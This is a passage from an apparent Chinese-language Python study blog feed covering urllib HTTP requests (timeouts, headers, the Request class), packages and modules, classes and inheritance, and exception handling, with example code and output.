<span class="string">"9"</span>, \n    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, \n    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>, \n    <span class="string">"User-Agent"</span>: <span class="string">"Python-urllib/3.8"</span>, \n    <span class="string">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e6b3508-41c947dc947274526b62f5e4"</span>\n  &#125;, \n  <span class="string">"json"</span>: null, \n  <span class="string">"origin"</span>: <span class="string">"112.113.48.105"</span>, \n  <span class="string">"url"</span>: <span class="string">"http://httpbin.org/post"</span>\n&#125;\n'&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="超时时间"><a href="#超时时间" class="headerlink" title="超时时间"></a>超时时间</h4><p>有时由于网络延迟较高或者服务器处理能力有限等问题，导致客户端向服务器端发送请求时间长就会产生超时，我们可以在程序中通过设置timeout参数避免由于请求超时造成的程序崩溃<br>例如：<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">#设置timeout参数值是<span class="number">0.001</span>秒</span><br><span class="line">response=urllib<span class="selector-class">.request</span>.urlopen(<span class="string">"http://www.baidu.com"</span>,timeout=<span class="number">0.001</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(response.read()</span></span>)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">socket<span class="selector-class">.timeout</span>: timed out</span><br></pre></td></tr></table></figure></p>
<p>这是由于我们设置的时间太短了，服务端都还没有来得及反应</p>
<h4 id="响应状态码和头信息"><a href="#响应状态码和头信息" class="headerlink" title="响应状态码和头信息"></a>响应状态码和头信息</h4><p>例如：<br>获取响应状态码<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">response=urllib<span class="selector-class">.request</span>.urlopen(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(response.status)</span></span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="number">200</span></span><br></pre></td></tr></table></figure><br>获取头信息<br><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">response=urllib.request.urlopen(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line"><span class="meta">#获取整个响应头信息</span></span><br><span class="line">print(<span class="string">"headers:"</span>,response.getheaders())</span><br><span class="line"><span class="meta">#获取头信息中的日期</span></span><br><span class="line">print(<span class="string">"header date:"</span>,response.getheader(<span class="string">"Date"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"></span><br><span class="line">headers: [('Bdpagetype', '1'), ('Bdqid', '0xe4ed<span class="number">03630002</span>6bd5'), ('Cache-Control', 'private'), ('Content-Type', 'text/html'), ('Cxy_all', 'baidu+c7b4ec4a079ad225d0af1f352eb1ad61'), ('Date', 'Fri, 13 Mar <span class="number">2020</span> 07:33:02 GMT'), ('Expires', 'Fri, 13 Mar <span class="number">2020</span> 07:32:56 GMT'), ('P3p', 'CP=" OTI DSP COR IVA OUR IND COM "'), ('P3p', 'CP=" OTI DSP COR IVA OUR IND COM "'), ('Server', 'BWS/1.1'), ('Set-Cookie', 'BAIDUID=ADB580B75B<span class="number">1525</span>2E13BC8B<span class="number">23263758</span>5E:FG=1; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=<span class="number">2147483647</span>; path=/; domain=.baidu.com'), ('Set-Cookie', 'BIDUPSID=ADB580B75B<span class="number">1525</span>2E13BC8B<span class="number">23263758</span>5E; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=<span class="number">2147483647</span>; path=/; domain=.baidu.com'), ('Set-Cookie', 'PSTM=<span class="number">1584084782</span>; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=<span class="number">2147483647</span>; path=/; domain=.baidu.com'), ('Set-Cookie', 'BAIDUID=ADB580B75B<span class="number">1525</span>2EB<span class="number">0544</span>AF4A9BEFC98:FG=1; max-age=<span class="number">31536000</span>; expires=Sat, 13-Mar-21 07:33:02 GMT; domain=.baidu.com; path=/; version=1; comment=bd'), ('Set-Cookie', 'delPer=0; path=/; domain=.baidu.com'), ('Set-Cookie', 'BDSVRTM=0; path=/'), ('Set-Cookie', 'BD_HOME=0; path=/'), ('Set-Cookie', 'H_PS_PSSID=<span class="number">3096</span>9_<span class="number">1438</span>_<span class="number">3104</span>4_<span class="number">2110</span>7_<span class="number">3099</span>6_<span class="number">3082</span>3; path=/; domain=.baidu.com'), ('Traceid', '<span class="number">15840847820221</span><span class="number">27873016495844</span><span class="number">733864799189</span>'), ('Vary', 'Accept-Encoding'), ('X-Ua-Compatible', 'IE=Edge,chrome=1'), ('Connection', 'close'), ('Transfer-Encoding', 'chunked')]</span><br><span class="line">header date: Fri, <span class="number">13</span> Mar <span class="number">2020</span> <span class="number">07</span>:<span class="number">33</span>:<span class="number">02</span> GMT</span><br><span class="line"></span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<h3 id="urllib-request-Request类"><a href="#urllib-request-Request类" class="headerlink" title="urllib.request.Request类"></a>urllib.request.Request类</h3><p>使用urlopen函数可以向目标URL地址发送基本的请求，但是参数比较简单，无法完成一些复杂的操作，比如在请求中添加headers头信息等。为了解决更复杂的问题，可以使用内置的Request类构建一个Request对象，给这个对象添加更多的属性</p>
<p>构造方法：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">Request:</span></span><br><span class="line">	<span class="symbol">def</span> <span class="symbol">_init_</span>(<span class="symbol">self,<span class="symbol">url</span>,<span class="symbol">data</span></span>=<span class="symbol">None,<span class="symbol">headers</span></span>=&#123;&#125;)</span><br><span class="line">    	origin_req_host=None,unverifiable=False</span><br><span class="line">        method=None):</span><br></pre></td></tr></table></figure><br>构造方法中设置了6个参数，下表介绍了各个参数</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>参数名称</th>
<th>是否必选</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>url</td>
<td>是</td>
<td>HTTP请求的目标URL地址</td>
</tr>
<tr>
<td>data</td>
<td>否</td>
<td>HTTP请求要传输的数据，数据是bytes字节流类型</td>
</tr>
<tr>
<td>headers</td>
<td>否</td>
<td>请求头信息，头信息使用字典存储</td>
</tr>
<tr>
<td>origin_req_host</td>
<td>否</td>
<td>发起HTTP请求的主机名称或者IP地址</td>
</tr>
<tr>
<td>unverifiable</td>
<td>否</td>
<td>表示这个请求是否为无法验证的，默认值是False</td>
</tr>
<tr>
<td>method</td>
<td>否</td>
<td>发起HTTP请求的方式，如GET,POST等</td>
</tr>
</tbody>
</table>
</div>
<p>例如：<br>在Request对象中添加浏览器相关的头信息，将程序伪装成浏览器发送POST请求<br><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">url=<span class="string">"http://httpbin.org/post"</span></span><br><span class="line">headers=&#123;<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0(Macintosh;Intel Mac OS X 10_13_6) AppleWebKit/537.36(KHTML,like Gecko) Chrome/69.0.3497.100 Safari/537.36"</span>&#125;</span><br><span class="line">data_dict=&#123;<span class="string">"word"</span>:<span class="string">"hello world"</span>&#125;</span><br><span class="line"><span class="comment">#将字典类型转换成bytes字节流</span></span><br><span class="line">data=bytes(urllib.parse.urlencode(data_dict),encoding=<span class="string">"utf8"</span>)</span><br><span class="line"><span class="comment">#创建Request对象</span></span><br><span class="line">request_obj=urllib.request.Request(url=url,data=data,headers=headers,method=<span class="string">"POST"</span>)</span><br><span class="line">response=urllib.request.urlopen(request_obj)</span><br><span class="line">print(response.read().decode(<span class="string">"utf8"</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"args"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"data"</span>: <span class="string">""</span>, </span><br><span class="line">  <span class="string">"files"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"form"</span>: &#123;</span><br><span class="line">    <span class="string">"word"</span>: <span class="string">"hello world"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"headers"</span>: &#123;</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"identity"</span>, </span><br><span class="line">    <span class="string">"Content-Length"</span>: <span class="string">"16"</span>, </span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, </span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>, </span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0(Macintosh;Intel Mac OS X 10_13_6) AppleWebKit/537.36(KHTML,like Gecko) Chrome/69.0.3497.100 Safari/537.36"</span>, </span><br><span class="line">    <span class="string">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e6b3af9-53e5f28ea618462a74e2c46e"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"json"</span>: null, </span><br><span class="line">  <span class="string">"origin"</span>: <span class="string">"112.113.48.105"</span>, </span><br><span class="line">  <span class="string">"url"</span>: <span class="string">"http://httpbin.org/post"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.正则表达式默认是贪心模式，添加?就可以调整为非贪心模式</p>
<p>2.正则表达式如果想匹配全体数据可以使用,.*?组合使用</p>
<p>3.正则表达式在面对一些复杂的验证时，会比较复杂，可以使用正则表达式的工具来构造正则表达式，或者使用<a href="https://c.runoob.com/front-end/854来进行验证" target="_blank" rel="noopener">https://c.runoob.com/front-end/854来进行验证</a></p>
<p>4.urllib模块，在引入时需要import urllib.request才能成功，import urllib会出现错误</p>
<p>5.urllib模块中，read()方法可以读取URL获取的内容</p>
<p>6.response对象是默认的关键字，可以自定义对象来代替</p>
<p>7.引入parse模块，同样需要import urllib.parse，Request类使用更加灵活，且更能体现面向对象编程的理论</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2020/3/6-基础3</title>
    <url>/2020/03/05/Python3-2020-3-6-%E5%91%A8%E6%8A%A52/</url>
    <content><![CDATA[<h1 id="包和模块"><a href="#包和模块" class="headerlink" title="包和模块"></a>包和模块</h1><h2 id="包"><a href="#包" class="headerlink" title="包"></a>包</h2><p>在python种包与普通文件夹的区别是，在包内要创建一个<code>_init_.py</code>文件，来标识它不是一个普通文件夹，而是一个包。</p>
<p>一个项目可以包含多个包，一个包可以包含多个子包，也可以包含多个模块<br>例如：<br><img src="/img/python3/0.png" alt="avatar"></p>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>在python中一个以<code>.py</code>结尾的python文件就是一个模块，不同包下可以有相同名称的模块，模块之间使用”包名.模块名”的方式区分。如果一个模块中引入其他模块有多种方式可以实现</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>描述</th>
<th>引入方法</th>
</tr>
</thead>
<tbody>
<tr>
<td>引入单个模块</td>
<td>import model_name </td>
</tr>
<tr>
<td>引入多个模块</td>
<td>import model_name1,model_name2</td>
</tr>
<tr>
<td>引入模块中的指定函数或类</td>
<td>from model_name import func…</td>
</tr>
</tbody>
</table>
</div>
<p>例如：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/buss/model1.py</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">project_info</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">"*"</span>*<span class="number">20</span>)<span class="comment">#打印20个*号</span></span><br><span class="line">    print(<span class="string">""</span>*<span class="number">4</span>,<span class="string">"python项目"</span>,<span class="string">""</span>*<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> buss.model1.py</span><br></pre></td></tr></table></figure></p>
<h2 id="init-py模块"><a href="#init-py模块" class="headerlink" title="_init_.py模块"></a>_init_.py模块</h2><p>在python中一个包中必须包含一个含默认的<code>_init_.py</code>模块。在pycharm中会自动创建一个。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## \_name_变量</span><br><span class="line">和C，JAVA等编写的程序，在运行时都是需要从一个主入口开始执行的。以面向对象的JAVA为例，在编写JAVA程序时，要在代码的主类中定义一个main函数作为程序的入口，编译器在执行时先找到main函数，从main函数开始运行</span><br><span class="line"></span><br><span class="line">python属于&lt;font color&#x3D;&quot;#0000dd&quot;&gt;脚本语言&lt;&#x2F;font&gt;，在运行时与其他编程语言不同，python程序没有编译过程，不需要进行编译成二进制代码再运行，而是从上到下依次执行的</span><br><span class="line"></span><br><span class="line">在python中内部定义了一个&#96;&#96;&#96;_name_&#96;&#96;&#96;变量，当被直接运行输出时，可以当作是&#96;&#96;&#96;_main_</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">"当前运行的_name_值是&#123;&#125;"</span>.format(_name_))</span><br><span class="line">   </span><br><span class="line">结果为：</span><br><span class="line">当前运行的_name_值是_main_</span><br></pre></td></tr></table></figure>
<p>当引入了test_model模块时，并调用test_info函数<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> test_model</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">"当前运行的_name_值是&#123;&#125;"</span>.format(_name_))</span><br><span class="line">    print(<span class="string">"---------------------"</span>)</span><br><span class="line">    info()</span><br><span class="line">    test_model.test_info()</span><br><span class="line">    </span><br><span class="line">结果为：</span><br><span class="line">当前运行的_name_值是_main_</span><br><span class="line">---------------------</span><br><span class="line">test_info正在运行，_name_值是test_model</span><br></pre></td></tr></table></figure></p>
<p>通过这个例子可以看出当有模块被引入，且调用了其中的函数或方法是，<code>_name_</code>的值等于模块名</p>
<p>所以在通常情况下，如果一个python源码文件既要作为模块在其他地方被引用，又要在其他地方单独运行时，就可以在源码文件中国加入<code>if_name_==&quot;_main_&quot;</code>的条件判断，也可以将这段代码作为Python源码文件的入口</p>
<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>简单的来说，面向对象编程就是一种解决软件复用的设计和编程方法。<br>对象就是类的实例化</p>
<h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><p>类是虚的，抽象的<br>对象是实的，就是类的实例化或被称为是具体表现</p>
<h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>类由类名，属性，方法三部分组成<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> 方法名<span class="params">(self[,参数列表])</span>:</span></span><br><span class="line">    方法体</span><br></pre></td></tr></table></figure><br>定义类时要先使用class关键字，声明这是一个类，类名要遵循标识符的规则。<br>类内部定义的函数叫做方法，当调用一个对象的方法时，对象会将自身的引用传递到调用的方法中。</p>
<h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>创建对象的方法是：变量=类名（[参数列表]）<br>例如：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"吃骨头"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">drink</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"喝水"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"跑"</span>)</span><br><span class="line">wangcai=Dog()</span><br><span class="line">wangcai.eat()</span><br><span class="line">wangcai.drink()</span><br><span class="line">wangcai.run()</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">吃骨头</span><br><span class="line">喝水</span><br><span class="line">跑</span><br></pre></td></tr></table></figure></p>
<h2 id="init-构造方法"><a href="#init-构造方法" class="headerlink" title="_init_构造方法"></a>_init_构造方法</h2><p>构造方式的作用是在创建一个类的对象时，进行一些初始化操作。<br>例如：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_init_</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"正在初始化"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"吃骨头"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">drink</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"喝水"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"跑"</span>)</span><br><span class="line">wangcai=Dog()</span><br><span class="line">wangcai.eat()</span><br><span class="line">wangcai.drink()</span><br><span class="line">wangcai.run()</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">吃骨头</span><br><span class="line">喝水</span><br><span class="line">跑</span><br></pre></td></tr></table></figure><br>结果显示我们并没有调用<code>_init_</code>构造方法，程序自动调用了该构造方法，打印了其中的内容<br>我们可以利用构造函数来对参数赋值：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_init_</span><span class="params">(self,variety,gender)</span>:</span></span><br><span class="line">      print(<span class="string">"正在初始化"</span>)</span><br><span class="line">      self.variety=variety</span><br><span class="line">      self.gender=gender</span><br><span class="line">      print(<span class="string">"初始化结束"</span>)</span><br><span class="line"><span class="comment">#创建对象</span></span><br><span class="line">wangcai=Dog(<span class="string">"金毛"</span>，<span class="string">"雄性"</span>)</span><br><span class="line">print(<span class="string">"旺财的品种是&#123;&#125;"</span>.format(wangcai.variety))</span><br><span class="line">print(<span class="string">"旺财的性别是&#123;&#125;"</span>.format(wangcai.gender))</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">正在初始化</span><br><span class="line">初始化结束</span><br><span class="line">旺财的品种是金毛</span><br><span class="line">旺财的性别是雄性</span><br></pre></td></tr></table></figure><br>从结果我们可以看出，_init_构造函数在对象实例化时执行。</p>
<h2 id="访问权限"><a href="#访问权限" class="headerlink" title="访问权限"></a>访问权限</h2><p>JAVA中的访问权限有<code>default,public,private,protected</code>。分别是<code>默认的，公共的，私有的和保护的</code></p>
<p>在python中不需要任何关键字修饰，只需要在属性或方法名前添加两个下划线<code>__</code>即为私有的访问权限，反之则是公有的<br>例如：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_init_</span><span class="params">(self,name)</span>:</span></span><br><span class="line">      self.name=name</span><br><span class="line">      self.__age=<span class="number">1</span><span class="comment">#私有属性</span></span><br></pre></td></tr></table></figure></p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>继承是面向对象带来的好处之一，解决了代码重用的问题</p>
<h3 id="单继承"><a href="#单继承" class="headerlink" title="单继承"></a>单继承</h3><p>所谓的单继承就是只继承一个父类<br>定义格式：<code>class Son(Father)</code></p>
<p>例如：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"吃"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">drink</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"喝"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"睡"</span>)</span><br><span class="line">      </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span><span class="params">(Animal)</span>:</span><span class="comment">#继承了Animal类</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">hand</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"握手"</span>)</span><br><span class="line">      </span><br><span class="line">wangcai=Dog()</span><br><span class="line">wangcai.eat()</span><br><span class="line">wangcai.drink()</span><br><span class="line">wangcai.hand()</span><br><span class="line">wangcai.sleep()</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">吃</span><br><span class="line">喝</span><br><span class="line">握手</span><br><span class="line">睡</span><br></pre></td></tr></table></figure><br>从结果可以看出Dog类中并没有定义eat,drink,sleep方法，但是由于继承了父类Animal，所以就继承了其中的所有公有方法和属性</p>
<h3 id="super函数"><a href="#super函数" class="headerlink" title="super函数"></a>super函数</h3><p>如果在子类中想要调用父类的方法，有两种实现方法：<br>第一种:父类名.方法名(self[参数列表])<br>第二种：super().方法名</p>
<p>例如：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span><span class="params">(Animal)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">hand</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"握手"</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">goldenDog</span><span class="params">(Dog)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">guide</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"我能导航"</span>)</span><br><span class="line">      print(<span class="string">"导航前请与我握手"</span>)</span><br><span class="line">      Dog.hand(self)</span><br><span class="line"></span><br><span class="line">duoduo=goldenDog()</span><br><span class="line">duoduo.guide()</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">我能导航</span><br><span class="line">导航前请与我握手</span><br><span class="line">握手</span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span><span class="params">(Animal)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">hand</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"握手"</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">goldenDog</span><span class="params">(Dog)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">guide</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"我能导航"</span>)</span><br><span class="line">      print(<span class="string">"导航前请与我握手"</span>)</span><br><span class="line">      super().hand()</span><br><span class="line"></span><br><span class="line">duoduo=goldenDog()</span><br><span class="line">duoduo.guide()</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">我能导航</span><br><span class="line">导航前请与我握手</span><br><span class="line">握手</span><br></pre></td></tr></table></figure></p>
<p>看到结果是一样的，在简单的继承下两者并无什么区别，但是在复杂的继承条件下，super()函数表现的更为灵活简单</p>
<h3 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h3><p>重写就是在子类中定义与父类同名的方法，而其中实现的内容却不一样<br>例如：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"吃"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">drink</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"喝"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"跑"</span>)</span><br><span class="line">      </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span><span class="params">(Animal)</span>:</span><span class="comment">#继承了Animal类</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"狗能摇着尾巴跑"</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span><span class="params">(Animal)</span>:</span><span class="comment">#继承了Animal类</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">      print(<span class="string">"猫不能摇着尾巴跑"</span>)</span><br><span class="line">      </span><br><span class="line">animal=Animal()</span><br><span class="line">animal.run()</span><br><span class="line"></span><br><span class="line">dog=Dog()</span><br><span class="line">dog.run()</span><br><span class="line"></span><br><span class="line">cat=Cat()</span><br><span class="line">cat.run()</span><br><span class="line"></span><br><span class="line">结果为</span><br><span class="line">跑</span><br><span class="line">狗能摇着尾巴跑</span><br><span class="line">猫不能摇着尾巴跑</span><br></pre></td></tr></table></figure></p>
<h3 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h3><p>多继承其实就是一个子类继承了两个或两个以上的父类<br>定义格式：<code>class Son(Father1，Father2...)</code></p>
<p>其余方法和定义与单继承基本一致，不多介绍</p>
<h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><p>在程序运行过程中常会遇到各种异常，代码问题，网络问题，逻辑问题等，需要对这些异常进行预处理，才能保证程序的正常执行</p>
<h2 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h2><p>格式：<br><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	可能产生异常的代码块</span><br><span class="line"><span class="keyword">except</span> ExceptionType <span class="keyword">as</span> err:</span><br><span class="line">	异常处理</span><br></pre></td></tr></table></figure></p>
<p>例如：<br>打开一个不存在的文件，产生异常<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">file</span>=<span class="keyword">open</span>(<span class="string">"test.txt"</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">file</span>.<span class="keyword">read</span>())</span><br><span class="line"><span class="keyword">file</span>.<span class="keyword">close</span>()</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"读取结束"</span>)</span><br><span class="line"></span><br><span class="line">结果为</span><br><span class="line">运行就会造成异常</span><br></pre></td></tr></table></figure></p>
<p>捕获异常：<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">	<span class="keyword">file</span>=<span class="keyword">open</span>(<span class="string">"test.txt"</span>)</span><br><span class="line">	<span class="keyword">print</span>(<span class="keyword">file</span>.<span class="keyword">read</span>())</span><br><span class="line">	<span class="keyword">file</span>.<span class="keyword">close</span>()</span><br><span class="line">except FileNotFoundError <span class="keyword">as</span> <span class="keyword">err</span>:</span><br><span class="line">	<span class="keyword">print</span>(<span class="string">"读取结束,文件不存在"</span>,<span class="keyword">err</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">结果为</span><br><span class="line">读取结束,文件不存在</span><br></pre></td></tr></table></figure></p>
<h2 id="捕获多个异常"><a href="#捕获多个异常" class="headerlink" title="捕获多个异常"></a>捕获多个异常</h2><p>格式：<br><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	可能产生异常的代码块</span><br><span class="line"><span class="keyword">except</span> (ExceptionType1,ExceptionType2,...) <span class="keyword">as</span> err:</span><br><span class="line">	异常处理</span><br></pre></td></tr></table></figure></p>
<p>其余与捕获异常基本类似</p>
<h2 id="捕获全部异常"><a href="#捕获全部异常" class="headerlink" title="捕获全部异常"></a>捕获全部异常</h2><p>格式：<br><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	可能产生异常的代码块</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> err_all:</span><br><span class="line">	异常处理</span><br></pre></td></tr></table></figure></p>
<h2 id="异常中的finally语句"><a href="#异常中的finally语句" class="headerlink" title="异常中的finally语句"></a>异常中的finally语句</h2><p>在程序中，如果一段代码必须要执行，就是无论发生异常，都要执行的代码，需要用finally语句<br>例如：<br><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">f</span>=<span class="keyword">open</span>(<span class="string">"test.txt"</span>)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"打印文件内容"</span>)</span><br><span class="line">except Exception <span class="keyword">as</span> err_al<span class="variable">l:</span></span><br><span class="line">	<span class="keyword">print</span>(<span class="string">"捕获到了异常"</span>,err_all)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">	<span class="keyword">print</span>(<span class="string">"关闭连接"</span>)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">捕获到了异常</span><br><span class="line">关闭连接</span><br></pre></td></tr></table></figure></p>
